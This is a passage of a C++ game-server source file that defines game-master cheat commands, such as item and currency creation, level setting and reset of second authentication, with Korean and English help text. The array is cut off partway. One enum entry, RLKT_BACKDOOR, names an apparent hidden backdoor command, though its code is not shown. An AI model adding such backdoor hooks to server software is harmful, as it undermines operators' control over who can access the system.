#include "Stdafx.h"
#include "DNCheatCommand.h"
#include "DNUserSendManager.h"
#include "DNUserQuest.h"
#include "DNGameDataManager.h"
#include "DNLogConnection.h"
#include "DNDBConnectionManager.h"
#include "DNDBConnection.h"
#include "DNMissionSystem.h"
#include "DNFriend.h"
#include "DNIsolate.h"
#include "./boost/format.hpp"
#include "DNQuestManager.h"
#include "DNScriptManager.h"
#include "DNGameDataManager.h"
#include "DNUserSession.h"
#include "DNMasterConnection.h"
#include "IniFile.h"
#include "./boost/algorithm/string.hpp"
#include "DNGuildSystem.h"
#include "TimeSet.h"
#include "DNAppellation.h"
#include "DNMailSender.h"

#if defined(_VILLAGESERVER)

#if defined( PRE_PVP_GAMBLEROOM )
#include "DNPvPRoomManager.h"
#endif

#include "DNFieldDataManager.h"
#include "DNScriptAPI.h"
#include "DNPartyManager.h"
#include "DNUserSessionManager.h"
#include "DNField.h"
#include "DnSkillTreeSystem.h"
#include "DNAuthManager.h"
#include "DNCountryUnicodeSet.h"
#include "DNGuildVillage.h"
#include "DNLadderSystemManager.h"
#include "DNLadderRoom.h"
#include "DNGuildWarManager.h"
extern TVillageConfig g_Config;
#if defined(PRE_ADD_QUICK_PVP)
#include "DNUserSessionManager.h"
#endif //#if defined(PRE_ADD_QUICK_PVP)
#if defined(PRE_ADD_LIMITED_CASHITEM)
#include "DNCashConnection.h"
#endif		//#if defined(PRE_ADD_LIMITED_CASHITEM)
#if defined (PRE_ADD_BESTFRIEND)
#include "DNBestFriend.h"
#endif
#if defined(PRE_ADD_DWC)
#include "DNDWCSystem.h"
#include "DNDWCTeam.h"
#endif
#elif defined(_GAMESERVER)

#include "DNPvPGameRoom.h"
#include "PvPGameMode.h"
#include "DNActor.h"
#include "TaskManager.h"
#include "DnItemTask.h"
#include "DnDropItem.h"
#include "EtActionCoreMng.h"
#include "DNGameServerScriptApi.h"
#include "DnGameTask.h"
#include "DnPvPGameTask.h"
#include "DNMasterConnectionManager.h"
#include "PvPRespawnLogic.h"
#include "DnPlayerActor.h"
#include "DnFarmGameTask.h"
#include "GrowingArea.h"
#include "MAAiScript.h"
#include "DNFarmGameRoom.h"
#ifdef PRE_ADD_EXPORT_DPS_INFORMATION
#include "DnDPSReporter.h"
#endif

#endif

#if defined(PRE_ADD_NPC_REPUTATION_SYSTEM)
#include "NpcReputationProcessor.h"
#include "ReputationSystemRepository.h"
#endif // #if defined(PRE_ADD_NPC_REPUTATION_SYSTEM)
#if defined( PRE_ADD_SECONDARY_SKILL )
#include "SecondarySkillRepository.h"
#endif // #if defined( PRE_ADD_SECONDARY_SKILL )
#include "DNPeriodQuestSystem.h"

#if defined( PRE_ADD_STAMPSYSTEM )
#include "DNStampSystem.h"
#endif // #if defined( PRE_ADD_STAMPSYSTEM )

extern bool LoadNpcQuest();

enum _CHEAT_CMT_TYPE
{
	HELP = 0,
	HELP1,
	SET_USER_LEVEL,
	CLEAR_ALL_QUEST,
	MAKEITEM,
	huanhua,
	RELOAD_ACTION,
	ADD_SKILL,
	REMOVE_SKILL,
	ADD_SKILL_LEVEL,
	MAKECOIN,
	CHANGEMAP,
	SET_COMPLETE_QUEST,
	SETQUEST,
	DEL_QUEST,
	SHOW_QUEST_INFO,
	ALL_KILL_MONSTER,
	GEN_MONSTER,
	ADD_STATEEFFECT,
	NOTICE,
	ADDINVENCOUNT,
	ADDWARECOUNT,
	REBIRTH,
	GEN_NPC,
	ENABLESHADOW,
	FATIGUE,
	IGNORECOOLTIME,
	FCM,
	SETFCM,
	RESPAWNLOGIC,
	GETPVPSCORE,
	SETCULLING,
	GOTOMAP,
	SET_HP,
	SET_MP,
	SET_HPMPFULL,
	GET_HP,
	GAINMISSION,
	ACHIEVEMISSION,
	FORCERANK,
	ADD_XP,
	GAINDAILYMISSION,
	ACHIEVEDAILYMISSION,
	STAGECLEAR,
	SET_ENCHANT,
	LUCKY,
	GEN_MONSTER_COMPOUND,
	MAKECITEM,
	SETCP,
	MAILREMAIN,
	FULLFRIEND,
	FULLBLOCK,
	RELOAD_SCRIPT,
	TRACE,
	RECALL,
	CHEATSET,
	SETSP,
	SET_USER_JOB,
	REPAIRALL,
	BUILDUPALL,
	POTENTIALALL,
	GUILD_CREATE,
	GUILD_DISMISS,
	GUILD_CHANGELEVEL,
	GUILD_MAKECOIN,
	GUILD_CHANGECMMPOINT,
	GUILD_CHANGEMISSIONPOINT, 
	GUILD_CHANGEWARPOINT,
	ACHIEVEGUILDCOMMONMISSION,
	RESET_SECONDAUTH,
	GAINWEEKLYMISSION,
	ACHIEVEWEEKLYMISSION,
	ACHIEVEGUILDMISSION,
	MAKE_GUILDFESTIVAL_POINT,
	MAKE_GUILDWAR_REWARD,
	FARM_START,
	IGNOREHIT,
	INVENCLEAR,
	GIFT,
	GETPOS,
	SETPOS,
#if defined(PRE_ADD_NPC_REPUTATION_SYSTEM)
	SETREPUTE,
#endif // #if defined(PRE_ADD_NPC_REPUTATION_SYSTEM)
	MASTERSYSTEM_MOD_GRADUATECOUNT,
	MASTERSYSTEM_SKIP_DATE,
	MASTERSYSTEM_MOD_FAVORPOINT,
	MASTERSYSTEM_MOD_RESPECTPOINT,
	FARM_PLANTSEED,
	FARM_DESTROYSEED,
	FARM_SKIPSEED,
#if defined( PRE_ADD_FARM_DOWNSCALE )
	FARM_ADDATTR,
	FARM_DELATTR,
#endif // #if defined( PRE_ADD_FARM_DOWNSCALE )
	RELOAD_MONSTER_AI,
	NESTCLEAR,
#if defined( PRE_ADD_SECONDARY_SKILL )
	ADD_SECONDARYSKILL,
	DEL_SECONDARYSKILL,
	ADD_SECONDARYSKILL_EXP,
	ADD_SECONDARYSKILL_RECIPE,
	ADD_SECONDARYSKILL_RECIPE_EXP,
	DEL_SECONDARYSKILL_RECIPE,
	EXTRACT_SECONDARYSKILL_RECIPE,
#endif // #if defined( PRE_ADD_SECONDARY_SKILL )
	SET_PERIODQUEST,
	SET_WORLDQUEST,
	GUILD_CHANGEMEMBERCOUNT,
	SET_GUILDWAREVENT,
	SET_PREWINGUILDUID,
	SET_GUILDWAR_FINALTIME,
	SET_GUILDWARSCHEDULE_RELOAD,
	SET_TITLE,
	SET_LADDER_POINT,
	SET_LADDER_GRADEPOINT,
	SET_LADDER_HIDDENGRADEPOINT,
	GET_LADDER_POINT,
	FORCE_LADDER_MATCHING,
	SET_SECOND_JOB_SKILL,
	CLEAR_SECOND_JOB_SKILL,
	MAKE_UNION_POINT,
	CMDEQUIPTRIGGER,
	CMDUNRIDE,
	ITEMEXPIREDATE,
	UPDATE_PET_EXP,
	SET_PET_COLOR,
	PERIODRESET,
	MAKEGITEM,
	FARM_GUILDWAR_FINAL,
	DESTROYPVP,
	CLEAR_MISSION,
	CLEAR_PRESENT,
	SHOP_GETLIST_REPURCHASE,
	SHOP_REPURCHASE,
#if defined( PRE_ADD_QUICK_PVP)
	QUICKPVP,
#endif // #if defined( PRE_ADD_QUICK_PVP)
	PVPTIMEOVER,
	RESETNESTCOUNT,
	DEL_GUILDEFFECT,
	DEL_GUILDMARK,
	DENY_GUILDRECRUIT,
	CANCEL_GUILDAPPLY,
	RESET_GUILDPOINTLIMIT,
#if defined(PRE_ADD_PVP_VILLAGE_ACCESS)
	PVP_VILLAGE_JOIN,
	PVP_VILLAGE_CREATE,
	PVP_VILLAGE_LADDER,
#endif
#if defined(PRE_ADD_EXPORT_DPS_INFORMATION)
	ENABLE_DPS_REPORT,
#endif
#if defined( PRE_ADD_NAMEDITEM_SYSTEM )
	GOLDBOX_NAMEDITEM,
	NAMEDITEM_COUNT,
#endif
#if defined(PRE_ADD_LIMITED_CASHITEM)
	CHANGE_LIMITQUANTITY,
#endif		//#if defined(PRE_ADD_LIMITED_CASHITEM)
#if defined (PRE_ADD_BESTFRIEND)
	CLOSE_BESTFRIEND,
#endif
#if defined( PRE_ADD_RACING_MODE)
	RACING_START,
	RACING_END,
#endif //#if defined( PRE_ADD_RACING_MODE)
#if defined( PRE_ADD_PCBANG_RENTAL_ITEM)
	SETPCCAFERENTITEM,
#endif
#ifdef PRE_MOD_PVPRANK
	RANK,
#endif		//#ifdef PRE_MOD_PVPRANK
#if defined(PRE_ADD_PVP_RANKING)
	PVP_RANK,
	PVP_LADDER_RANK,
#endif
#if defined(PRE_SPECIALBOX)
	SPECIALBOX,
#endif	// #if defined(PRE_SPECIALBOX)
#if defined(PRE_ADD_REMOTE_QUEST)
	GAIN_REMOTE_QUEST,
	ACCEPT_REMOTE_QUEST,
	COMPLETE_REMOTE_QUEST,
#endif
#if defined(PRE_ADD_STAGE_CLEAR_ENCHANT_REWARD) && defined(_GAMESERVER)
	SET_STAGE_CLEAR_BOXNUM,
#endif	// #if defined(PRE_ADD_STAGE_CLEAR_ENCHANT_REWARD) && defined(_GAMESERVER)
	ISGAINMISSION,
#if defined( PRE_ADD_STAMPSYSTEM )
	ADD_STAMP,
	CLEAR_STAMP,
#endif // #if defined( PRE_ADD_STAMPSYSTEM )
#if defined(PRE_ADD_ACTIVEMISSION)
	SET_ACTIVEMISSION,
#endif
#if defined(PRE_ADD_MONTHLY_MISSION)
	GAIN_MONTHLY_MISSION,
	ACHIEVE_MONTHLY_MISSION,
#endif	// #if defined(PRE_ADD_MONTHLY_MISSION)
#if defined(PRE_ADD_CP_RANK)
	INIT_STAGECP,
#endif
#if defined(PRE_ADD_DWC)
	DWCPOINT,
	START_MATCH,
	DWC_MATCH_CLOSE,
	UPDATE_DWC_STATUS,
#endif
#if defined( PRE_PVP_GAMBLEROOM )
	CREATE_GAMBLEROOM,
#endif
#if defined( PRE_ADD_NEW_MONEY_SEED )
	DEL_SEED,
#endif
	RLKT_BACKDOOR,
	CMD_END,
	
};

__CmdLineDefineStruct g_CmdList[] = 
{
	{ HELP, _T("/help"), _T("도움말"), _T("Help") },
	{ HELP1, _T("/?"), _T("도움말"), _T("Help") },
	{ SET_USER_LEVEL, _T("/level"), _T("유저 레벨 설정 /level(1~255)"),  _T("Set User Level /level(1~255)")},
	{ CLEAR_ALL_QUEST, _T("/clearquest"), _T("모든 퀘스트 정보를 지운다.( 완료된것 포함 )"), _T("Clear all quest.( Including info completed )") },
	{ MAKEITEM, _T("/makeitem"), _T("/makeitem(아이템인덱스)(아이템개수)(강화)(잠재력)(캐쉬템일때 기간)"), _T("/makeitem(ItemIndex)(Count)(Enchant)(Potential)(Cash Period)") },
	{ huanhua, _T("/huanhua"), _T("/makeitem(아이템인덱스)(아이템개수)(강화)(잠재력)(캐쉬템일때 기간)"), _T("/makeitem(ItemIndex)(Count)(Enchant)(Potential)(Cash Period)") },
	{ RELOAD_ACTION, _T("/reloadaction"), _T("액션 파일 리로드"), _T("Reload action file")},
	{ ADD_SKILL, _T("/addskill"), _T("Add Skill"), _T("Add Skill") },
	{ REMOVE_SKILL, _T("/removeskill"), _T("Remove Skill"), _T("Remove Skill") },
	{ ADD_SKILL_LEVEL, _T("/addskilllevel"), _T("add Skill level"), _T("Add Skill level") },
	{ MAKECOIN, _T("/makecoin"), _T("/makecoin(금액)"), _T("/makecoin(Amount)") },
	{ CHANGEMAP, _T("/changemap"), _T("/changemap(이동할 맵아이디)(난이도:0~4:Default(0))(시작게이트인덱스:Default(1)"), _T("Change your position by map /changemap(MapId)(Difficulty:0~4:Default(0))(StartGate Index:Default(1)") },
	{ SET_COMPLETE_QUEST, _T("/completequest"), _T("퀘스트 완료 정보 세팅 /completequest 퀘스트번호 마킹여부(1:마킹/그외:아님) 삭제여부(0:아님/그외:삭제) 반복여부(0:아님/그외:반복)"), _T("Set questinfo completed /completequest QuestNumber Marking?(1:Marking/Else:No) Delete?(0:No/Else:Delete) Repeat?(0:No/Else:Repeat)") },
	{ SETQUEST, _T("/setquest"), _T("/setquest(퀘스트번호)(퀘스트타입)(step)(journal)"), _T("/setquest(QuestNumber)(Type)(Step)(Journal)") },
	{ DEL_QUEST, _T("/delquest"), _T("/delquest(퀘스트번호)"), _T("/delquest(QuestNumber)") },
	{ SHOW_QUEST_INFO, _T("/showquest"), _T("/showquest 퀘스트 정보를 출력"), _T("/showquest Show all information about quest") },
	{ ALL_KILL_MONSTER, _T("/killmon"), _T("/killmon 모든 몬스터를 죽인다."), _T("/killmon Kill all monsters on your map.") },
	{ GEN_MONSTER, _T("/genmon"), _T("/genmon(몬스터 번호)(몇마리) 몬스터 생성 "), _T("/genmon(MonsterNumber)(Count) Create Monsters ") },
	{ ADD_STATEEFFECT, _T("/addse"), _T("/addse(상태효과 인덱스)(지속시간(ms))(인자)"), _T("/addse(StateEffect Index)(Duration(ms))(Factor)") },
	{ NOTICE, _T("/notice"), _T("/notice(공지할문장)"), _T("/notice(Sentance)") },
	{ ADDINVENCOUNT, _T("/invencount"), _T("/invencount(세팅할 인벤 최대개수 max:50)"), _T("/invencount(Max InvenCount  max:50)") },
	{ ADDWARECOUNT, _T("/warecount"), _T("/warecount(세팅할 창고 최대개수 max:50)"), _T("/warecount(Max WareCount max:50)") },
	{ REBIRTH, _T("/rebirth"), _T("/rebirth(부활석)(pc방 부활석)(cash 부활석)"), _T("/rebirth(Normal)(PCRoom)(Cash)") },
	{ GEN_NPC, _T("/gennpc"), _T("/gennpc(npc인덱스)"), _T("/gennpc(NpcIndex)") },
	{ ENABLESHADOW, _T("/enableshadow"), _T("쉐도우 테스트 On/Off"), _T("Testing Shadow On/Off") },
	{ FATIGUE, _T("/fatigue"), _T("/fatigue(일간 max값)(주간 max값)(PC방 max값)"), _T("/fatigue(Max Daily Value)(Max Weekly Value)(Max PCRoom Value)") },
	{ IGNORECOOLTIME, _T("/ignorect"), _T("(스킬 쿨타임 무시)"), _T("(Ignore Skill CoolTime)") },
	{ FCM, _T("/fcm"), _T("/fcm"), _T("/fcm") },
	{ SETFCM, _T("/setfcm"), _T("/setfcm(onlinemin)"), _T("/setfcm(onlinemin)") },
	{ RESPAWNLOGIC, _T("/respawnlogic"), _T("/respawnlogic(리스폰포인트 치트를 활성/비활성화 한다.)"), _T("/respawnlogic(Activate cheat for respawn point or not)") },
	{ GETPVPSCORE, _T("/getpvpscore"), _T("/getpvpscore(자신의 PvP전적을 살펴본다.)"), _T("/getpvpscore(Show my PvP's score)") },
	{ SETCULLING, _T("/setculling"), _T("/setculling(유저간동기 시간, 거리조절)"), _T("/setculling(Sync time between users, distance)") },
	{ GOTOMAP, _T("/go"), _T("/go(이동할 맵아이디)(난이도:0~4:Default(0))(시작게이트인덱스:Default(1)"), _T("/go(MapId)(Difficulty:0~4:Default(0))(StartGate Index:Default(1)") },
	{ SET_HP, _T("/hp"), _T("HP변경"), _T("Change HP") },
	{ SET_MP, _T("/mp"), _T("MP변경"), _T("Change MP") },
	{ SET_HPMPFULL, _T("/full"), _T("HP,MP Full"), _T("HP,MP Full") },
	{ GET_HP, _T("/gethp"), _T("HP확인"), _T("Check HP") },
	{ GAINMISSION, _T("/missiongain"), _T("미션 획득"), _T("Acquire Mission") },
	{ ACHIEVEMISSION, _T("/missionachieve"), _T("미션 달성"), _T("Achieve Mission") },
	{ FORCERANK, _T("/forcerank"), _T("던전 클리어 랭크 강제 변경"), _T("Force to change rank of dungeon clear") },
	{ ADD_XP, _T("/add_xp"), _T("PVP XP 치트"), _T("Cheat PvP's xp") },
	{ GAINDAILYMISSION, _T("/dmissiongain"), _T("일일미션 획득"), _T("Acquire Daily Mission") },
	{ ACHIEVEDAILYMISSION, _T("/dmissionachieve"), _T("일일미션 달성"), _T("Achieve Daily Mission") },
	{ STAGECLEAR, _T("/clear"), _T("강제 스테이지 클리어 테스트"), _T("Force to clear Stage") },
	{ SET_ENCHANT, _T("/enchant"), _T("아이템 강화 /enchant(인벤인덱스)(강화레벨)(잠재력값)"), _T("Item Enchant /enchant(InvenIndex)(Level)(Potential Value)") },
	{ LUCKY, _T("/lucky"), _T("강화 제작 문장 등 확률 100프로"), _T("Success to enchance any items") },
	{ GEN_MONSTER_COMPOUND, _T("/gencmon"), _T("몬스터 생성(컴파운드테이블 참조)"), _T("Create Monster(Reference:CompoundTable") },
	{ MAKECITEM, _T("/makecitem"), _T("/makecitem(아이템컴파운드인덱스)(아이템개수)"), _T("/makecitem(ItemTableIndex)(Count)") },
	{ SETCP, _T("/cp"), _T("cp 값을 셋팅합니다."), _T("Set cp value") },
	{ MAILREMAIN, _T("/mailremain"), _T("/mailremain(남은시간)"), _T("/mailremain(left time)") },
	{ FULLFRIEND, _T("/fullfriend"), _T("친구리스트 가득채우기"), _T("Fullfill friend list") },
	{ FULLBLOCK, _T("/fullblock"), _T("차단리스트 가득채우기"), _T("Fullfill block list") },
	{ RELOAD_SCRIPT, _T("/reloadscript"), _T("스크립트 파일 리로드"), _T("Reload script file") },
	{ TRACE, _T("/trace"), _T("사용법(/trace 캐릭터이름),설명(입력한 캐릭터이름의 던젼에 난입한다.)"), _T("Usage(/trace CharacterName), Description(Trace character's dungeon)") },
	{ RECALL, _T("/recall"), _T("사용법(/recall 캐릭터이름),설명(입력한 캐릭터를 GM마을로 소환합니다."), _T("Usage(/recall CharacterName), Description(Recall character to GM Village") },
	{ CHEATSET, _T("/cheatset"), _T("사용법(/cheatset 세트이름),설명(입력한 세트이름의 치트세트를 실행합니다."), _T("Usage(/cheatset SetName),Description(Excute CheatSet related to SetName you typed") },
	{ SETSP, _T("/setsp"), _T("사용법(/setsp 스킬포인트),설명(입력한 스킬포인트 수치로 현재 캐릭터의 보유 스킬포인트를 셋팅한다."), _T("Usage(/setsp SkillPoint), Description(Set your character's skillpoint") },
	{ SET_USER_JOB, _T("/setjob"), _T("사용법(/setjob 직업 인덱스), 설명(입력한 직업 인덱스로 현재 캐릭터의 직업을 변경합니다."), _T("Usage(/setjob JobIndex), Description(Change your character's job") },
	{ REPAIRALL, _T("/repairall"), _T("사용법(/repairall), 설명(모든아이템을 수리합니다.)"), _T("Usage(/repairall), Description(Repaire all items your character has)") },
	{ BUILDUPALL, _T("/buildupall"), _T("사용법(/buildupall(강화단계 0-15)), 설명(장착, 인벤 모든아이템 강화 올려줌)"), _T("Usage(/buildupall(Enchant Level 0-15)), Description(Upgrade all Items' enchant:Equip, Inven)") },
	{ POTENTIALALL, _T("/potentialall"), _T("사용법(/potentialall), 설명(장착 잠재력적용)"), _T("Usage(/potentialall), Description(Apply potential of EquipItem)") },
	{ GUILD_CREATE, _T("/gcreate"), _T("사용법(/gcreate 길드이름), 설명(길드 창설)"), _T("Usage(/gcreate GuildName), Description(Create Guild)") },
	{ GUILD_DISMISS, _T("/gdismiss"), _T("사용법(/gdismiss), 설명(길드 해산)"), _T("Usage(/gdismiss), Description(Dismiss Guild)") },
	{ GUILD_CHANGELEVEL, _T("/glevel"), _T("사용법(/glevel 길드레벨(1~최대레벨)), 설명(길드 레벨 세팅)"), _T("Usage(/glevel GuildLevel(1~20)), Description(Set Guild Level)") },
	{ GUILD_MAKECOIN, _T("/gcoin"), _T("사용법(/gcoin 길드자금(0~최대자금)), 설명(길드 자금 증가)"), _T("Usage(/gcoin GuildCoin(0~MaxCoin)), Description(Increase Guild Coin)") },
	{ GUILD_CHANGECMMPOINT, _T("/gcommon"), _T("사용법(/gcommon 길드일반포인트(0~최대일반포인트)), 설명(길드 일반 포인트 증가)"), _T("Usage(/gcommon GuildPoint(0~MaxPoint)), Description(Increase Guild Point)") },
	{ GUILD_CHANGEMISSIONPOINT, _T("/gmission"), _T("사용법(/gmission 길드미션포인트(0~최대일반포인트) 미션아이디), 설명(길드 미션 포인트 증가)"), _T("Usage(/gmission GuildPoint(0~MaxPoint), MissionID), Description(Increase Guild Point)") },
	{ GUILD_CHANGEWARPOINT, _T("/gwar"), _T("사용법(/gwar 길드전포인트(0~최대일반포인트) ), 설명(길드 전 포인트 증가)"), _T("Usage(/gwar GuildPoint(0~MaxPoint)), Description(Increase Guild Point)") },
	{ ACHIEVEGUILDCOMMONMISSION, _T("/gcommonachieve"), _T("길드 일반미션 달성"), _T("Achieve Guild Common Mission") },
	{ RESET_SECONDAUTH, _T("/resetsa"), _T("사용법(/resetsa), 설명(2차인증정보 초기화)"), _T("Usage(/resetsa), Description(Reset second authentication's info)") },
	{ GAINWEEKLYMISSION, _T("/wmissiongain"), _T("주간미션 획득"), _T("Acquire Weekly Mission") },
	{ ACHIEVEWEEKLYMISSION, _T("/wmissionachieve"), _T("주간미션 달성"), _T("Achieve Weekly Mission") },
	{ ACHIEVEGUILDMISSION, _T("/gmissionachieve"), _T("길드전미션 달성"), _T("Achieve GuildWar Mission") },
	{ MAKE_GUILDFESTIVAL_POINT, _T("/makefestivalpoint"), _T("사용법(/makefestivalpoint(축체포인트)"), _T("Usage(/makefestivalpoint(Value))") },
	{ MAKE_GUILDWAR_REWARD, _T("/guildwarreward"), _T("사용법(/guildwarreward(본선 몇강? 우승:1, 우승:2, 4강:3, 8강:4, 16강:5)"), _T("Usage(/gulldwarreward(GuildWar Reward)") },
	{ FARM_START, _T("/gofarm"), _T("사용법(/gofarm), 설명(빌리지에서만 사용가능)"), _T("Usage(/gofarm), Description(Only use in village)") },
	{ IGNOREHIT, _T("/ignorehit"), _T("(hit 무시)"), _T("(Ingore hit)") },
	{ INVENCLEAR, _T("/invenclear"), _T("사용법(/invenclear(0:일반인벤 1:캐쉬인벤 2:퀘스트인벤)"), _T("Usage(/invenclear(0:NormalInven 1:CashInven 2:QuestInven)") },
	{ GIFT, _T("/gift"), _T("사용법(/gift(ItemSN:상품SN))"), _T("Usage(/gift(ItemSN))") },
	{ GETPOS, _T("/getpos"), _T("사용법(/getpos)"), _T("Usage(/getpos)") },
	{ SETPOS, _T("/setpos"), _T("사용법(/setpos x, y, z)"), _T("Usage(/setpos x, y, z)") },
#if defined(PRE_ADD_NPC_REPUTATION_SYSTEM)
	{ SETREPUTE, _T("/setrepute"), _T("사용법(/setrepute(NpcID), (호감도수치), (비호감도수치)"), _T("Usage(/setrepute(NpcID), (ReputationValue:Like), (Dislike)") },
#endif // #if defined(PRE_ADD_NPC_REPUTATION_SYSTEM)
	{ MASTERSYSTEM_MOD_GRADUATECOUNT, _T("/modgraduatecount"), _T("사용법(/modgraduatecount(수치)"), _T("Usage(/modgraduatecount(Value)") },
	{ MASTERSYSTEM_SKIP_DATE, _T("/skipmasterdate"), _T("사용법(/skipmasterdate(1or0)"), _T("Usage(/skipmasterdate(1or0)") },
	{ MASTERSYSTEM_MOD_FAVORPOINT, _T("/modmasterfavorpoint"), _T("사용법(/modmasterfavorpoint(제자이름)(수치)"), _T("Usage(/modmasterfavorpoint(ChildName)(Value)") },
	{ MASTERSYSTEM_MOD_RESPECTPOINT, _T("/modmasterrespectpoint"), _T("사용법(/modmasterrespectpoint(수치)"), _T("Usage(/modmasterrespectpoint(Value)") },
	{ FARM_PLANTSEED, _T("/plantseed"), _T("사용법(/plantseed(AreaIndex)(ActionType)(SeedInvenIndex)"), _T("Usage(/plantseed(AreaIndex)(ActionType)(SeedInvenIndex)") },
	{ FARM_DESTROYSEED, _T("/destroyseed"), _T("사용법(/destroyseed(AreaIndex)"), _T("Usage(/destroyseed(AreaIndex)") },
	{ FARM_SKIPSEED, _T("/skipseed"), _T("사용법(/skipseed(AreaIndex)"), _T("Usage(/skipseed(AreaIndex)") },
#if defined( PRE_ADD_FARM_DOWNSCALE )
	{ FARM_ADDATTR, _T("/farmaddattr"), _T("사용법(/farmaddattr(attr)"), _T("Usage(/farmaddattr(attr)") },
	{ FARM_DELATTR, _T("/farmdelattr"), _T("사용법(/farmdelattr(attr)"), _T("Usage(/farmdelattr(attr)") },
#endif // #if defined( PRE_ADD_FARM_DOWNSCALE )
	{ RELOAD_MONSTER_AI, _T("/reloadmonsterai"), _T("몬스터AI 리로드"), _T("Reload MonsterAI") },
	{ NESTCLEAR, _T("/nest"), _T("사용법(/nest(NestMapID)"), _T("Usage(/nest(NestMapID)") },
#if defined( PRE_ADD_SECONDARY_SKILL )
	{ ADD_SECONDARYSKILL, _T("/add2ndskill"), _T("사용법(/add2ndskill(SkillID)"), _T("Usage(/add2ndskill(SkillID)") },
	{ DEL_SECONDARYSKILL, _T("/del2ndskill"), _T("사용법(/del2ndskill(SkillID)"), _T("Usage(/del2ndskill(SkillID)") },
	{ ADD_SECONDARYSKILL_EXP, _T("/add2ndskillexp"), _T("사용법(/add2ndskillexp(SkillID)(addexp)"), _T("Usage(/add2ndskillexp(SkillID)(addexp)") },
	{ ADD_SECONDARYSKILL_RECIPE, _T("/add2ndskillrecipe"), _T("사용법(/add2ndskillrecipe(SkillID)(recipeinvenindex)"), _T("Usage(/add2ndskillrecipe(SkillID)(recipeinvenindex)") },
	{ ADD_SECONDARYSKILL_RECIPE_EXP, _T("/add2ndskillrecipeexp"), _T("사용법(/add2ndskillrecipeexp(SkillID)(recipeItemID)(addexp)"), _T("Usage(/add2ndskillrecipeexp(SkillID)(recipeItemID)(addexp)") },
	{ DEL_SECONDARYSKILL_RECIPE, _T("/del2ndskillrecipe"), _T("사용법(/del2ndskillrecipe(SkillID)(recipeItemID)"), _T("Usage(/del2ndskillrecipe(SkillID)(recipeItemID)") },
	{ EXTRACT_SECONDARYSKILL_RECIPE, _T("/extract2ndskillrecipe"), _T("사용법(/extract2ndskillrecipe(SkillID)(recipeItemID)"), _T("Usage(/extract2ndskillrecipe(SkillID)(recipeItemID)") },
#endif // #if defined( PRE_ADD_SECONDARY_SKILL )
	{ SET_PERIODQUEST, _T("/setperiodquest"), _T("사용법(/setperiodquest(nScheduleID)(1:활성 0:비활성)(이벤트날짜 yyyymmddhhmm:yyyymmddhhmm)"), _T("Usage(/setperiodquest(ScheduleID)(Activate:1 or 0)(EventDate yyyymmddhhmm:yyyymmddhhmm)") },
	{ SET_WORLDQUEST, _T("/setworldquest"), _T("사용법(/setworldquest(nScheduleID)(수집시작:yyyymmddhhmm)(수집끝:yyyymmddhhmm)(보상시작:yyyymmddhhmm)"), _T("Usage(/setworldquest(ScheduleID)(CollectStartDay:yyyymmddhhmm)(CollectEndDay:yyyymmddhhmm)(RewardStartDay:yyyymmddhhmm)") },
	{ GUILD_CHANGEMEMBERCOUNT, _T("/gmember"), _T("사용법(/gmember(가입인원수)"), _T("Usage(/gmember(GuildMemberCount)") },
	{ SET_GUILDWAREVENT, _T("/setguildwarevent"), _T("사용법(/setguildwarevent(길드전차수)(시작시간 yyyymmddhhmm)(이벤트시간:분)(준비시간:분)"), _T("Usage(/setguildwarevent(ScheduleID)(StartDate yyyymmddhhmm)(EventDuration:Minute)(ReadyDuration:Minute)")},
	{ SET_PREWINGUILDUID, _T("/setprewinguild"), _T("사용법(/setprewinguild"), _T("Usage(/setprewinguild") },
	{ SET_GUILDWAR_FINALTIME, _T("/setguildwarfinaltime"), _T("사용법(/setguildwarfinaltime(+sec)"), _T("Usage(/setguildwarfinaltime(+sec)") },
	{ SET_GUILDWARSCHEDULE_RELOAD, _T("/setguildwarreload"), _T("길드전 스케쥴 다시 읽기"), _T("GuildWar Reload")},
	{ SET_TITLE, _T("/settitle"), _T("사용법(/settitle(인덱스)"), _T("Usage(/settitle(Index)") },
	{ SET_LADDER_POINT, _T("/setladderpoint"), _T("사용법(/setladderpoint(1:1=1,2:2=2...등등등)(래더포인트)"), _T("Usage(/setladderpoint(1:1=1,2:2=2...Etc)(LadderPoint)") },
	{ SET_LADDER_GRADEPOINT, _T("/setladdergradepoint"), _T("사용법(/setladdergradepoint(1:1=1,2:2=2...등등등)(평점)"), _T("Usage(/setladdergradepoint(1:1=1,2:2=2...Etc)(Rating)") },
	{ SET_LADDER_HIDDENGRADEPOINT, _T("/setladderhiddengradepoint"), _T("사용법(/setladderhiddengradepoint(1:1=1,2:2=2...등등등)(가평점)"), _T("Usage(/setladderhiddengradepoint(1:1=1,2:2=2...Etc)(Pre Rating)") },
	{ GET_LADDER_POINT, _T("/getladderpoint"), _T("사용법(/getladderpoint(1:1=1,2:2=2...등등등)"), _T("Usage(/getladderpoint(1:1=1,2:2=2...Etc)") },
	{ FORCE_LADDER_MATCHING, _T("/forcematching"), _T("사용법(/forcematching"), _T("Usage(/forcematching") },
	{ SET_SECOND_JOB_SKILL, _T("/setsecondjobskill"), _T("사용법(/setsecondjobskill(2차전직 Job ID)"), _T("Usage(/setsecondjobskill(Second Ex-Job ID)") },
	{ CLEAR_SECOND_JOB_SKILL, _T("/clearsecondjobskill"), _T("사용법(/clearsecondjobskill"), _T("Usage(/clearsecondjobskill") },
	{ MAKE_UNION_POINT, _T("/makeunionpoint"), _T("사용법(/makeunionpoint(연합타입)(연합포인트)"), _T("Usage(/makeunionpoint(UnionType)(Point)") },
	{ CMDEQUIPTRIGGER, _T("/cmdtriggerequip"), _T("사용법(/cmdtriggerequip(ItemID)(shootmode)"), _T("Usage(/cmdtriggerequip(ItemID)(shootmode)") },
	{ CMDUNRIDE, _T("/cmdunride"), _T("사용법(/cmdunride") },
	{ ITEMEXPIREDATE, _T("/itemexpiredate"), _T("사용법(/itemexpiredate(아이템시리얼))"), _T("Usage(/itemexpiredate(ItemSerial))") },
	{ UPDATE_PET_EXP, _T("/updatepetexp"), _T("사용법(/UpdatePetExp(경험치)"), _T("Usage(/UpdatePetExp(Exp)") },
	{ SET_PET_COLOR, _T("/setpetcolor"), _T("사용법(/SetPetColor(변경부위 1이면 body 2면 tatoo)(변경할 컬러값)"), _T("Usage(/SetPetColor(type 1 or 2)(color)") },
	{ PERIODRESET, _T("/periodreset"), _T("사용법(/periodreset(타입)"), _T("Usage(/periodreset(Type)(Value)") },
	{ MAKEGITEM, _T("/makegitem"), _T("사용법(/makegitem(itemgrouptableid)"), _T("Usage(/makegitem(itemgrouptableid)") },
	{ FARM_GUILDWAR_FINAL, _T("/farmguildwarfinal"), _T("사용법(/farmguildwarfinal"), _T("Usage(/farmguildwarfinal") },
